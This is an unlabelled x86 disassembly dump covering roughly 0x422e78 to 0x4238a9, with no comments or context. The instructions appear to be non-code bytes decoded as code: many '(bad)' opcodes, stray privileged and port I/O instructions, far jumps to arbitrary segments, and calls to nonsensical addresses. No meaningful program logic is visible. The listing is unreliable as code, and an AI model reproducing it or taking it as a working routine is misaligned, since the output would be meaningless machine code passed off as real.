  422e78:	mov    esp,0x6400d48d
  422e7d:	mov    bl,0x5
  422e80:	pusha  
  422e81:	int    0x3f
  422e83:	add    BYTE PTR [eax-0x14ffc1d7],bl
  422e89:	push   es
  422e8a:	and    ah,cl
  422e8c:	add    DWORD PTR [si-0x58],esp
  422e90:	or     eax,0xcb00068
  422e95:	jmp    0x32c1:0xaea73c2d
  422e9c:	xor    eax,0xa004515
  422ea1:	fsubr  st(4),st
  422ea3:	push   cs
  422ea4:	dec    ebp
  422ea5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ea6:	xchg   DWORD PTR [edi+0x5f85b981],edi
  422eac:	and    eax,0x2d3fc9a7
  422eb1:	sti    
  422eb2:	imul   edi,DWORD PTR [esi],0xd
  422eb5:	inc    ax
  422eb7:	and    al,0x71
  422eb9:	pop    DWORD PTR [ebx+0x0]
  422ebc:	into   
  422ebd:	xor    DWORD PTR [edi],eax
  422ebf:	add    DWORD PTR [eax],0x0
	...
  422ede:	int    0xfa
  422ee0:	out    0x88,al
  422ee2:	push   ebx
  422ee3:	mov    ds:0xf006744b,eax
  422ee8:	ss push cs
  422eea:	pop    ebp
  422eeb:	(bad)  
  422eec:	mov    cl,0x93
  422eee:	or     al,0xa7
  422ef0:	lods   eax,DWORD PTR ds:[esi]
  422ef1:	add    eax,0x6e997f3d
  422ef6:	or     al,0xa7
  422ef8:	shl    DWORD PTR ds:0xffd8c5a5,0x8a
  422eff:	sub    edi,esp
  422f01:	dec    DWORD PTR [edi+0x4e000804]
  422f07:	jnp    0x422e96
  422f09:	jmp    0x422e99
  422f0b:	dec    edx
  422f0c:	or     eax,0x15af081
  422f11:	sub    eax,0xc256014e
  422f17:	xor    DWORD PTR [ecx-0x3e028419],edi
  422f1d:	cld    
  422f1e:	xchg   esi,eax
  422f1f:	test   BYTE PTR [edi+0x2a60b9f5],0x38
  422f26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f27:	call   ebp
  422f29:	cmp    ebp,ecx
  422f2b:	call   DWORD PTR [eax-0x6d583f4c]
  422f31:	inc    ecx
  422f32:	and    bh,BYTE PTR [ebx+eiz*2+0x71ee9fc3]
  422f39:	dec    eax
  422f3a:	add    eax,0x4f8ee487
  422f3f:	or     al,0x60
  422f41:	dec    ecx
	...
  422f5e:	add    BYTE PTR [eax],al
  422f60:	or     DWORD PTR [edi+0x429213a3],eax
  422f66:	repz mov WORD PTR [ecx],cs
  422f69:	es jecxz 0x422fc5
  422f6c:	xchg   edx,eax
  422f6d:	xor    eax,0xb84fc9db
  422f72:	call   0x70423c7a
  422f77:	dec    edx
  422f78:	std    
  422f79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f7a:	(bad)  
  422f7b:	or     ebx,0xffffffbb
  422f7e:	popa   
  422f7f:	push   edx
  422f80:	sbb    DWORD PTR [ecx-0x583d7323],ecx
  422f86:	out    dx,eax
  422f87:	pop    ecx
  422f88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f89:	js     0x422f40
  422f8b:	add    al,0xd
  422f8d:	es xchg ebx,eax
  422f8f:	popa   
  422f90:	xchg   esi,eax
  422f91:	xor    eax,0xbb2cac93
  422f96:	test   ecx,eax
  422f98:	test   ebx,eax
  422f9a:	sbb    eax,0xe2be5262
  422f9f:	add    ebx,esi
  422fa1:	xchg   BYTE PTR [edx-0x7b],bh
  422fa4:	data16 adc BYTE PTR [ebp-0x729aa8],bh
  422fab:	add    cl,BYTE PTR ds:0x8c0fdbbb
  422fb1:	dec    ebp
  422fb2:	dec    edi
  422fb3:	rcr    DWORD PTR [ecx+0x35],0xef
  422fb7:	mov    cl,bh
  422fb9:	mov    ebx,0xb1fc05d0
  422fbe:	jmp    DWORD PTR [ebx+0x2]
  422fc1:	mov    al,0x57
  422fc3:	pusha  
	...
  422fe0:	add    BYTE PTR [eax],al
  422fe2:	add    dh,BYTE PTR [edi+eiz*8-0x344faa3]
  422fe9:	mov    edx,0xfb180e4d
  422fee:	into   
  422fef:	dec    DWORD PTR [eax-0x30fd15e]
  422ff5:	ins    BYTE PTR es:[edi],dx
  422ff6:	inc    esi
  422ff7:	das    
  422ff8:	xor    al,0x72
  422ffa:	push   eax
  422ffb:	sbb    al,0x89
  422ffd:	fld    DWORD PTR [ecx]
  422fff:	dec    esi
  423000:	lock jne 0x422ffa
  423003:	jge    0x422ffa
  423005:	pop    esp
  423006:	adc    ecx,DWORD PTR [ecx+0x4ae7dd52]
  42300c:	or     BYTE PTR [edx+0x15],bl
  42300f:	mov    edi,ebp
  423011:	ret    0x88fc
  423014:	dec    edi
  423015:	in     eax,dx
  423016:	ror    DWORD PTR [ebp-0x8],1
  423019:	cmp    dl,BYTE PTR [edi]
  42301b:	add    DWORD PTR [edx-0x43],0xffffff97
  42301f:	dec    ebp
  423020:	clc    
  423021:	es nop
  423023:	jp     0x423030
  423025:	loop   0x42309e
  423027:	xor    cl,dl
  423029:	fs fs sub eax,0xa2676861
  423030:	add    cl,ch
  423032:	push   cs
  423033:	xor    esi,DWORD PTR cs:[edx-0x25]
  423037:	mov    bl,0x82
  423039:	ja     0x422ff4
  42303b:	push   eax
  42303c:	mov    DWORD PTR [ecx*2+0x40e147f1],esp
  423043:	adc    al,0xc6
  423045:	lods   al,BYTE PTR ds:[esi]
	...
  423062:	add    BYTE PTR [eax],al
  423064:	sbb    eax,0x35e5100
  423069:	sbb    al,0x12
  42306b:	test   eax,0xde42860e
  423070:	in     eax,dx
  423071:	pop    ecx
  423072:	mov    DWORD PTR [eax],0x89000726
  423078:	jl     0x42307c
  42307a:	jge    0x42303d
  42307c:	xchg   edx,eax
  42307d:	add    al,BYTE PTR [eax]
  42307f:	add    BYTE PTR [ebp+0x61c60846],ch
  423085:	paddw  mm5,mm2
  423088:	jmp    0x8be:0x8f013d89
  42308f:	push   eax
  423090:	mov    ecx,0x7ae81bf3
  423095:	fdivr  st,st(4)
  423097:	push   DWORD PTR [eax-0x43]
  42309a:	jo     0x423063
  42309c:	outs   dx,DWORD PTR ds:[esi]
  42309d:	inc    esp
  42309e:	and    BYTE PTR [ebx+0xcf5e5f4],cl
  4230a4:	out    0xee,eax
  4230a6:	sbb    ecx,DWORD PTR [ebp+0x43850334]
  4230ac:	adc    al,0xf8
  4230ae:	mov    bl,0x8b
  4230b0:	xor    DWORD PTR [ebp+eax*4+0x6],esi
  4230b4:	pop    edi
  4230b5:	inc    edi
  4230b6:	cld    
  4230b7:	mov    edx,esi
  4230b9:	pop    es
  4230ba:	add    DWORD PTR [esi-0x77000250],esp
  4230c0:	repnz or esp,edi
  4230c3:	mov    edi,0xff5650f7
	...
  4230e4:	add    BYTE PTR [eax],al
  4230e6:	mov    eax,ds:0xb4401215
  4230eb:	scas   al,BYTE PTR es:[edi]
  4230ec:	xlat   BYTE PTR ds:[ebx]
  4230ed:	xor    ecx,DWORD PTR [ebx-0x6ddba544]
  4230f3:	scas   eax,DWORD PTR es:[edi]
  4230f4:	or     esi,DWORD PTR [esi-0x49f458ce]
  4230fa:	sub    ch,BYTE PTR [eax-0x30483901]
  423100:	repz icebp 
  423102:	pop    esi
  423103:	adc    ebx,edi
  423105:	je     0x423117
  423107:	adc    al,0x67
  423109:	ror    BYTE PTR ds:0x1f438fbb,cl
  42310f:	add    DWORD PTR [ebp+edi*8-0x8],edx
  423113:	pop    esi
  423114:	adc    al,BYTE PTR [eax+0xd]
  423117:	es enter 0x880b,0xe7
  42311c:	aaa    
  42311d:	sbb    DWORD PTR [edx],ecx
  42311f:	xor    DWORD PTR [esi+0x24],eax
  423122:	retf   0xb89d
  423125:	jno    0x423182
  423127:	sub    eax,0xd8d2456
  42312c:	bnd jo 0x423124
  42312f:	fnstenv [edx-0x37]
  423132:	adc    esp,ebp
  423134:	mov    edx,DWORD PTR [ebp+0x31]
  423137:	push   cs
  423138:	loop   0x42318f
  42313a:	add    bl,ah
  42313c:	sbb    al,0x12
  42313e:	dec    ebp
  42313f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423140:	pop    ebp
  423141:	mov    cl,dh
  423143:	cmp    eax,0x2d0d03c2
  423148:	inc    ebx
  423149:	and    eax,DWORD PTR [eax]
	...
  423167:	add    BYTE PTR [edx],dl
  423169:	cdq    
  42316a:	enter  0xcdfd,0xd9
  42316e:	jb     0x42312f
  423170:	add    bh,BYTE PTR [ecx]
  423172:	mov    bh,0x96
  423174:	ret    0x8879
  423177:	push   ebp
  423178:	call   0x2755fcba
  42317d:	sar    DWORD PTR [ebp-0x7049168d],cl
  423183:	inc    ebx
  423184:	fadd   st(0),st
  423186:	push   eax
  423187:	std    
  423188:	clc    
  423189:	loop   0x4231a0
  42318b:	inc    eax
  42318c:	or     eax,0x5e0bc526
  423191:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423192:	test   eax,0xe81296c0
  423197:	add    ebx,ebx
  423199:	std    
  42319a:	ror    DWORD PTR [ebx],1
  42319c:	loop   0x4231bb
  42319e:	mov    esp,0xeeffca88
  4231a3:	sub    cl,BYTE PTR [ebp+0xb]
  4231a6:	ins    BYTE PTR es:[edi],dx
  4231a7:	or     DWORD PTR ss:[ebp-0x3b5fd1c],eax
  4231ae:	daa    
  4231af:	cli    
  4231b0:	inc    ebx
  4231b1:	sub    eax,0xbd490f2
  4231b6:	cdq    
  4231b7:	stos   DWORD PTR es:[edi],eax
  4231b8:	enter  0xe6d0,0x3
  4231bc:	and    al,0xfd
  4231be:	clc    
  4231bf:	ret    
  4231c0:	mov    ?,WORD PTR [edi+0x48280e9a]
  4231c6:	out    dx,eax
  4231c7:	mov    ah,BYTE PTR [ecx+0xbe8207]
	...
  4231e9:	add    BYTE PTR [esi],al
  4231eb:	push   ecx
  4231ec:	push   DWORD PTR [ebx]
  4231ee:	notrack jmp esi
  4231f1:	pop    esi
  4231f2:	imul   eax,edx,0xffffffe2
  4231f5:	add    edx,DWORD PTR [esp+edi*1+0x413407cb]
  4231fc:	fbstp  TBYTE PTR [edx]
  4231fe:	add    cl,BYTE PTR [ecx-0x3f8bf3d9]
  423204:	jmp    0xe508:0x57853d55
  42320b:	push   ebx
  42320c:	mov    ah,0x4
  42320e:	or     eax,0xd08a956
  423213:	dec    ebp
  423214:	jb     0x4231c6
  423216:	lea    esp,[esi+edx*8+0x16012750]
  42321d:	mov    ebp,0x43f6dc1f
  423222:	or     eax,0x1a38a67d
  423227:	repz mov cl,0x51
  42322a:	cmp    al,0x2a
  42322c:	call   0xcf4fc285
  423231:	adc    ecx,ebp
  423233:	jmp    DWORD PTR [ebx-0x3c]
  423236:	(bad)  
  423237:	daa    
  423238:	add    BYTE PTR [edx],bl
  42323a:	mov    al,BYTE PTR [edx-0x4]
  42323d:	sbb    DWORD PTR [edi],esp
  42323f:	mov    bh,0x64
  423241:	xchg   ecx,eax
  423242:	sub    DWORD PTR [eax+0x0],eax
  423245:	pop    esi
  423246:	cli    
  423247:	jecxz  0x423258
  423249:	test   eax,0xd5bf830e
	...
  42326a:	add    BYTE PTR [eax],al
  42326c:	push   edi
  42326d:	mov    al,BYTE PTR [edx+0x3d]
  423270:	loope  0x4231fc
  423272:	inc    edx
  423273:	inc    ecx
  423274:	(bad)  [edx-0x4b1ec6be]
  42327a:	jb     0x4232a9
  42327c:	xchg   BYTE PTR [edx-0x8],bl
  42327f:	es add dh,al
  423282:	pop    gs
  423284:	push   cs
  423285:	cmp    DWORD PTR [edi+0x72b5029d],0x15
  42328c:	push   eax
  42328d:	xor    bh,al
  42328f:	push   es
  423290:	inc    edx
  423291:	mov    al,0x54
  423293:	(bad)  
  423294:	sbb    ebp,esp
  423296:	pop    gs
  423298:	push   cs
  423299:	cmp    DWORD PTR [edi+0x72b50374],0xffffffe5
  4232a0:	test   eax,0x4efb8811
  4232a5:	add    BYTE PTR [ecx+0x38b3cd24],al
  4232ab:	ficomp DWORD PTR [edx]
  4232ad:	add    al,0xc5
  4232af:	out    dx,eax
  4232b0:	sbb    al,BYTE PTR [eax]
  4232b2:	add    cl,ch
  4232b4:	xchg   edi,eax
  4232b5:	xor    al,0x4
  4232b7:	pusha  
  4232b8:	pop    eax
  4232b9:	or     BYTE PTR [ecx+0x1a7cd24],cl
  4232bf:	fcmove st,st(6)
  4232c1:	push   edi
  4232c2:	(bad)  
  4232c3:	stos   BYTE PTR es:[edi],al
  4232c4:	cmp    ecx,DWORD PTR [ecx-0x76bcc715]
  4232ca:	xor    cl,cl
  4232cc:	(bad)  
  4232cd:	aas    
	...
  4232ee:	sub    eax,DWORD PTR [edi-0x15db03bf]
  4232f4:	jmp    FWORD PTR [ecx+0x64]
  4232f7:	call   0xabc31f8
  4232fc:	sti    
  4232fd:	(bad)  
  4232fe:	stc    
  4232ff:	ret    0x3a71
  423302:	ret    
  423303:	or     eax,0x2a4130c
  423308:	jg     0x423302
  42330a:	ds in  eax,dx
  42330c:	sub    cl,BYTE PTR [ebx-0x3f7e8987]
  423312:	js     0x4232be
  423314:	in     al,0xd1
  423316:	sbb    BYTE PTR [ebx],al
  423318:	add    BYTE PTR [ebx+0x74fb7dfc],cl
  42331e:	adc    DWORD PTR [edi+0x7364fc41],eax
  423324:	jno    0x423322
  423326:	pop    ebx
  423327:	call   0xabc3228
  42332c:	sti    
  42332d:	(bad)  
  42332e:	jns    0x4232f1
  423330:	jo     0x423336
  423332:	jg     0x4232f0
  423334:	out    0x8,eax
  423336:	fwait
  423337:	imul   ebx,ebp,0x2f01e4d4
  42333d:	rcl    BYTE PTR [ebx+0x5a],0xc5
  423341:	ret    0x1e8
  423344:	push   esi
  423345:	mov    edi,ecx
  423347:	fist   DWORD PTR [eax]
  423349:	inc    eax
  42334a:	in     al,0x52
  42334c:	push   0x1
  42334e:	shl    eax,cl
  423350:	and    edx,DWORD PTR [eax+eax*1]
	...
  42336f:	add    bh,bl
  423371:	push   cs
  423372:	xchg   DWORD PTR [eax+ecx*1+0x8],edx
  423376:	xchg   edi,ecx
  423378:	int3   
  423379:	jb     0x423320
  42337b:	add    BYTE PTR [ebp+esi*1-0x1c608b43],dh
  423382:	(bad)  
  423383:	push   esi
  423384:	or     eax,0x9588d18e
  423389:	sbb    al,0xb9
  42338b:	jb     0x423400
  42338d:	ficomp WORD PTR [ecx-0x3e]
  423390:	adc    eax,0x69894fa7
  423395:	sub    ah,BYTE PTR [eax+0x10338ef7]
  42339b:	push   ecx
  42339c:	ret    
  42339d:	jne    0x423358
  42339f:	jb     0x4233b2
  4233a1:	xor    dh,BYTE PTR [esi-0x74611f04]
  4233a7:	jae    0x4233d2
  4233a9:	sti    
  4233aa:	mov    cl,BYTE PTR [ebx-0xf]
  4233ad:	sahf   
  4233ae:	mov    ecx,0x40cc0912
  4233b3:	add    BYTE PTR [esi+0x2d87f0f],al
  4233b9:	sbb    ecx,DWORD PTR [ebp+0x9a72aff]
  4233bf:	mov    ch,0xd0
  4233c1:	scas   al,BYTE PTR es:[edi]
  4233c2:	xchg   DWORD PTR [ebx-0xf],eax
  4233c5:	scas   al,BYTE PTR es:[edi]
  4233c6:	push   eax
  4233c7:	std    
  4233c8:	cdq    
  4233c9:	mov    edx,0x63c20d0c
  4233ce:	add    al,0x6a
  4233d0:	psubsb mm4,QWORD PTR [ebx+0xf]
	...
  4233ef:	add    BYTE PTR [eax],al
  4233f1:	add    BYTE PTR [esi],al
  4233f3:	call   0x7f4f9e4b
  4233f8:	jl     0x4233f9
  4233fa:	jmp    0xf3a:0xf8fd55a6
  423401:	inc    eax
  423402:	or     eax,0x972c124
  423407:	sbb    bl,ch
  423409:	call   0x247f6677
  42340e:	and    eax,0x40fcb92a
  423413:	fmul   QWORD PTR [edx+esi*1+0x40cc01]
  42341a:	aaa    
  42341b:	add    BYTE PTR [edi-0x3cac75aa],dl
  423421:	pop    ss
  423422:	cwde   
  423423:	int    0x61
  423425:	clc    
  423426:	dec    BYTE PTR [edx]
  423428:	daa    
  423429:	add    al,0x16
  42342b:	add    bh,ah
  42342d:	add    edx,DWORD PTR ds:0xddb41150
  423433:	mov    ah,0x9d
  423435:	mov    edx,0x4f6203ff
  42343a:	xor    eax,esp
  42343c:	xor    BYTE PTR gs:0x2dfaa89,dl
  423443:	test   al,0xbf
  423445:	mov    edx,0xb3c0b451
  42344a:	dec    ecx
  42344b:	sub    ecx,DWORD PTR [ebx]
  42344d:	sbb    al,0x94
  42344f:	xlat   BYTE PTR ds:[ebx]
  423450:	cmp    eax,0x35b4efd1
  423455:	mov    edx,0x0
	...
  423472:	add    BYTE PTR [eax],al
  423474:	cmp    DWORD PTR [edi-0x3f],ecx
  423477:	mov    bl,0x29
  423479:	sub    ecx,ebx
  42347b:	pop    ss
  42347c:	and    ah,cl
  42347e:	adc    DWORD PTR [ecx],eax
  423480:	mov    gs,WORD PTR [ebp-0x275fa66]
  423486:	lods   eax,DWORD PTR ds:[esi]
  423487:	pop    ecx
  423488:	xchg   esp,eax
  423489:	mov    edi,0x55ef8ea1
  42348e:	sub    DWORD PTR [ebx],ecx
  423490:	or     eax,0x73a7624d
  423495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423496:	fiadd  DWORD PTR [ecx*1-0xd72c300]
  42349d:	add    edx,DWORD PTR [esi-0x5b78f6c1]
  4234a3:	ret    
  4234a4:	mov    bl,0x10
  4234a6:	loop   0x42346a
  4234a8:	xchg   ebp,eax
  4234a9:	inc    ebp
  4234aa:	out    dx,eax
  4234ab:	mov    WORD PTR [ebx],cs
  4234ad:	mov    DWORD PTR [ebx],esp
  4234af:	or     BYTE PTR [ecx+ecx*2-0x2d302b00],al
  4234b6:	pop    es
  4234b7:	loop   0x423488
  4234b9:	jp     0x4234fd
  4234bb:	cmc    
  4234bc:	mov    edi,DWORD PTR [esi]
  4234be:	or     al,0x70
  4234c0:	sbb    dh,BYTE PTR [edi-0x79ab6903]
  4234c6:	adc    BYTE PTR [ecx-0x51034b39],0x2
  4234cd:	stos   DWORD PTR es:[edi],eax
  4234ce:	std    
  4234cf:	jle    0x423485
  4234d1:	mov    dl,0xfc
  4234d3:	jmp    0xe9c4f1e6
	...
  4234f4:	add    BYTE PTR [eax],al
  4234f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234f7:	mov    ah,0xfc
  4234f9:	in     eax,dx
  4234fa:	push   cs
  4234fb:	add    BYTE PTR [eax],al
  4234fd:	push   ecx
  4234fe:	sub    ah,BYTE PTR [ecx]
  423500:	std    
  423501:	push   esi
  423502:	mov    bh,0xba
  423504:	shl    ecx,0xe
  423507:	dec    edi
  423508:	mov    DWORD PTR [ebp-0x78],edx
  42350b:	lahf   
  42350c:	neg    DWORD PTR [eax-0x16f3c96f]
  423512:	(bad)  [ecx+0x55]
  423515:	mov    ch,0xb
  423517:	mov    DWORD PTR [edx-0x3],ebx
  42351a:	(bad)  
  42351b:	mov    eax,0xb3741ebf
  423520:	jne    0x4234d5
  423522:	xor    DWORD PTR [esi],0x890c6208
  423528:	aas    
  423529:	fisttp QWORD PTR [ebx-0x7626e7ba]
  42352f:	stos   DWORD PTR es:[edi],eax
  423530:	out    0x48,eax
  423532:	(bad)  [edx+0x2ed165fc]
  423538:	inc    ecx
  423539:	jb     0x423548
  42353b:	mov    DWORD PTR [edi-0xb],ebp
  42353e:	adc    DWORD PTR [eax+0x7f013786],esi
  423544:	fcom   DWORD PTR [ebp+0x1c]
  423547:	mov    ch,0x72
  423549:	add    BYTE PTR [eax+0x198bbf83],bh
  42354f:	or     al,0x53
  423551:	(bad)  
  423552:	cli    
  423553:	or     ebp,eax
  423555:	pop    eax
  423556:	jnp    0x4235cf
  423558:	sti    
  423559:	mov    eax,DWORD PTR [eax]
	...
  423577:	add    BYTE PTR [ecx+0x10],cl
  42357a:	xchg   DWORD PTR [ebp-0x64],edi
  42357d:	add    DWORD PTR [ecx+0xc],0x2f
  423581:	dec    ecx
  423582:	or     BYTE PTR [ecx+0x442bf72],cl
  423588:	je     0x423588
  42358a:	add    DWORD PTR [eax],eax
  42358c:	std    
  42358d:	pop    eax
  42358e:	or     al,0x8b
  423590:	arpl   WORD PTR [ebx-0x43],di
  423593:	adc    BYTE PTR [ebp+0x46],dh
  423596:	adc    al,0xb0
  423598:	jne    0x4235fd
  42359a:	(bad)  
  42359b:	xor    DWORD PTR [eax+ebx*2],esp
  42359e:	pop    esi
  42359f:	pop    ebx
  4235a0:	out    dx,eax
  4235a1:	xchg   ecx,eax
  4235a2:	pop    ecx
  4235a3:	ret    0xfe44
  4235a6:	push   eax
  4235a7:	mov    ebx,eax
  4235a9:	jnp    0x423593
  4235ab:	or     al,0x97
  4235ad:	ja     0x423620
  4235af:	adc    BYTE PTR [ecx-0xcc0c0f],ch
  4235b5:	dec    esi
  4235b6:	test   DWORD PTR [ebp+0x0],ebx
  4235b9:	xchg   BYTE PTR [ecx-0x4],bl
  4235bc:	cld    
  4235bd:	jno    0x4235d0
  4235bf:	add    DWORD PTR [edx+esi*1],esp
  4235c2:	mov    ebp,0x7178eb75
  4235c7:	hlt    
  4235c8:	sbb    al,0x63
  4235ca:	into   
  4235cb:	add    ah,ah
  4235cd:	cmp    DWORD PTR [edi+0x8bb2d5b],0x0
  4235d4:	sti    
  4235d5:	jecxz  0x4235d2
  4235d7:	inc    DWORD PTR [ecx+0x70]
  4235da:	sti    
  4235db:	jne    0x4235dd
	...
  4235f9:	add    al,ch
  4235fb:	push   0x71
  4235fd:	or     BYTE PTR ds:0xcafd42bf,cl
  423603:	ret    0xd789
  423606:	mov    dh,0x5b
  423608:	jle    0x4235c9
  42360a:	inc    eax
  42360b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42360c:	mov    esi,edi
  42360e:	(bad)  
  42360f:	out    dx,eax
  423610:	cmovo  ebx,DWORD PTR [edi]
  423613:	cli    
  423614:	cmp    BYTE PTR [edi-0x77037223],0x3d
  42361b:	scas   eax,DWORD PTR es:[edi]
  42361c:	xchg   DWORD PTR [ebx+0xf],eax
  42361f:	mov    bh,0x89
  423621:	push   cs
  423622:	xchg   esi,eax
  423623:	pop    edi
  423624:	call   0x1057ccf2
  423629:	or     DWORD PTR [edi+edx*8-0x7],0x4a9dfac9
  423631:	mov    ebp,ebx
  423633:	sahf   
  423634:	add    edi,ebp
  423636:	es push ebp
  423638:	push   esi
  423639:	jbe    0x42364a
  42363b:	push   ss
  42363c:	(bad)  
  42363d:	rcr    BYTE PTR [esi],0xe7
  423640:	test   al,0x14
  423642:	xchg   esi,eax
  423643:	lahf   
  423644:	stc    
  423645:	dec    ebx
  423646:	jmp    0x864f65f9
  42364b:	outs   dx,DWORD PTR ds:[esi]
  42364c:	cld    
  42364d:	jle    0x42367b
  42364f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423650:	add    BYTE PTR [eax],al
  423652:	popf   
  423653:	scas   eax,DWORD PTR es:[edi]
  423654:	inc    esp
  423655:	and    al,0x11
  423657:	xchg   ebx,eax
  423658:	pop    es
  423659:	mov    ecx,ecx
  42365b:	mov    edx,0xe7fc
	...
  42367c:	imul   ecx,DWORD PTR [edx],0xffffffb5
  42367f:	cld    
  423680:	nop
  423681:	out    0x2e,al
  423683:	fmul   st(7),st
  423685:	stos   BYTE PTR es:[edi],al
  423686:	add    BYTE PTR [ebx-0x7a],dl
  423689:	add    dl,BYTE PTR [ebx-0x77]
  42368c:	dec    ebx
  42368d:	fwait
  42368e:	push   ecx
  42368f:	push   ebp
  423690:	nop
  423691:	out    0x2f,al
  423693:	push   0xffffff8e
  423695:	jmp    DWORD PTR [esi+0x15a83d01]
  42369b:	rcl    dl,cl
  42369d:	mov    al,0x61
  42369f:	mov    ebx,0x80cb3293
  4236a4:	shr    DWORD PTR [ebx],0x1f
  4236a7:	scas   al,BYTE PTR es:[edi]
  4236a8:	push   eax
  4236a9:	cld    
  4236aa:	out    0x88,eax
  4236ac:	push   eax
  4236ad:	adc    BYTE PTR [ebx],bh
  4236af:	imul   DWORD PTR [ecx+0x7abdf29]
  4236b5:	into   
  4236b6:	out    0x3,al
  4236b8:	test   BYTE PTR [edi-0x8e1499d],dh
  4236be:	xchg   ebp,eax
  4236bf:	in     eax,dx
  4236c0:	xchg   ebp,eax
  4236c1:	cmp    edi,ebx
  4236c3:	mov    dh,0xff
  4236c5:	pop    es
  4236c6:	pop    DWORD PTR [ecx+0x7b]
  4236c9:	mov    al,0x7d
  4236cb:	mov    dh,0xff
  4236cd:	mov    bl,0x61
  4236cf:	cmp    eax,0xbf4b119
  4236d4:	mov    bh,BYTE PTR [edx]
  4236d6:	out    dx,eax
  4236d7:	dec    esi
  4236d8:	xchg   BYTE PTR [edx],bh
  4236da:	out    dx,eax
  4236db:	stos   DWORD PTR es:[edi],eax
  4236dc:	pop    eax
  4236dd:	mov    dh,0x55
  4236df:	mov    dh,0x0
	...
  4236fd:	add    cl,ah
  4236ff:	test   BYTE PTR [esi],ch
  423701:	stos   DWORD PTR es:[edi],eax
  423702:	pop    ss
  423703:	into   
  423704:	out    0x3,al
  423706:	mov    WORD PTR [edi+eiz*8+0x8a50730],?
  42370d:	mov    edx,eax
  42370f:	pop    es
  423710:	lock cmp eax,0xb6f72c11
  423716:	lahf   
  423717:	mov    bl,0xe
  423719:	lods   eax,DWORD PTR ds:[esi]
  42371a:	inc    ebx
  42371b:	jmp    esi
  42371d:	repnz retf 0xb24f
  423721:	int3   
  423722:	int3   
  423723:	add    al,0xe7
  423725:	mov    dh,0x40
  423727:	scas   eax,DWORD PTR es:[edi]
  423728:	jae    0x423735
  42372a:	in     eax,0xac
  42372c:	push   ebx
  42372e:	mov    al,ds:0xa9f88ac
  423733:	jns    0x423777
  423735:	in     eax,0x9b
  423737:	add    ecx,DWORD PTR [eax]
  423739:	jmp    0xaf4e74c3
  42373e:	dec    ebp
  42373f:	clc    
  423740:	(bad)  
  423741:	call   0x1e9802bb
  423746:	xor    BYTE PTR [ebx],0x24
  423749:	aad    0xbd
  42374b:	lods   al,BYTE PTR ds:[esi]
  42374c:	cld    
  42374d:	cmp    eax,0x35fd13ad
  423752:	lods   eax,DWORD PTR ds:[esi]
  423753:	adc    ebp,eax
  423755:	retf   0xac61
  423758:	cld    
  423759:	jb     0x4237b4
  42375b:	xor    ch,0x1d
  42375e:	sub    DWORD PTR [ebp+0xc573],ebp
	...
  423780:	or     bl,BYTE PTR [eax-0x533f79c4]
  423786:	mov    BYTE PTR [ecx-0x1f8c540e],al
  42378c:	jmp    0x423755
  42378e:	jae    0x423774
  423790:	xchg   ebp,eax
  423791:	inc    ebp
  423792:	or     al,0x70
  423794:	or     al,0x79
  423796:	les    edi,FWORD PTR [esi-0x16f43e48]
  42379c:	fstp   TBYTE PTR [eax-0x15]
  42379f:	push   0xe8fefb75
  4237a4:	push   cs
  4237a5:	mov    dh,0x42
  4237a7:	in     eax,dx
  4237a8:	sqrtps xmm2,XMMWORD PTR [esi-0x62]
  4237ac:	xchg   ebp,eax
  4237ad:	sub    cl,BYTE PTR [eax]
  4237af:	fisub  WORD PTR [edx+0xee8ff79]
  4237b5:	icebp  
  4237b6:	mov    edi,0xa5a74872
  4237bb:	pop    ss
  4237bc:	shr    BYTE PTR [ebx-0x4a7de678],0x73
  4237c3:	add    BYTE PTR [edx-0x1b0002d9],dl
  4237c9:	bnd jle 0x42380a
  4237cc:	hlt    
  4237cd:	fisub  WORD PTR [ecx-0x75]
  4237d0:	stos   BYTE PTR es:[edi],al
  4237d1:	scas   al,BYTE PTR es:[edi]
  4237d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237d3:	add    ah,ah
  4237d5:	push   es
  4237d6:	add    BYTE PTR [ebp+0x4c],dh
  4237d9:	iret   
  4237da:	sti    
  4237db:	jmp    esp
  4237dd:	jae    0x423764
  4237df:	inc    esi
  4237e0:	test   al,0x9f
  4237e2:	mov    edi,0x89
	...
  4237ff:	add    BYTE PTR [eax],al
  423801:	add    cl,ch
  423803:	test   DWORD PTR [esi-0x78e9203a],0x71049f08
  42380d:	push   ss
  42380e:	das    
  42380f:	cmp    eax,DWORD PTR [ebx+eiz*1]
  423812:	pop    edi
  423813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423814:	dec    ecx
  423815:	or     al,0xf9
  423817:	div    edx
  423819:	inc    eax
  42381a:	js     0x42381e
  42381c:	add    BYTE PTR [esi],cl
  42381e:	je     0x4237fd
  423820:	jae    0xcfc93a6a
  423826:	pushf  
  423827:	dec    edx
  423828:	(bad)  
  423829:	jmp    ebx
  42382b:	sub    eax,0x577d75bd
  423830:	sbb    eax,0x87040a83
  423835:	dec    eax
  423836:	push   0x3400bd5b
  42383b:	cli    
  42383c:	push   DWORD PTR [ebx+0x29]
  42383f:	jg     0x42385d
  423841:	add    bh,bl
  423843:	add    al,0x7d
  423845:	loope  0x42383a
  423847:	jae    0x423835
  423849:	jmp    FWORD PTR [ebp+0x37eb043a]
  42384f:	jg     0x423873
  423851:	add    BYTE PTR [edi-0x3307894],bl
  423857:	call   0xef88:0x160dfffa
  42385e:	mov    BYTE PTR ds:0x6b67852e,dl
  423864:	or     BYTE PTR es:[eax],al
	...
  423883:	add    dl,dh
  423885:	je     0x42385f
  423887:	aad    0x4e
  423889:	xchg   edi,eax
  42388a:	mov    bl,0x12
  42388c:	sub    eax,ecx
  42388e:	inc    eax
  42388f:	add    BYTE PTR [esi+0x15a7abf],al
  423895:	and    al,0xc4
  423897:	or     al,0x91
  423899:	lods   eax,DWORD PTR ds:[esi]
  42389a:	add    eax,DWORD PTR [eax]
  42389c:	or     eax,0xd214344c
  4238a1:	popf   
  4238a2:	lock push DWORD PTR [edx-0x69f38269]
  4238a9:	loopne 0x4238b6
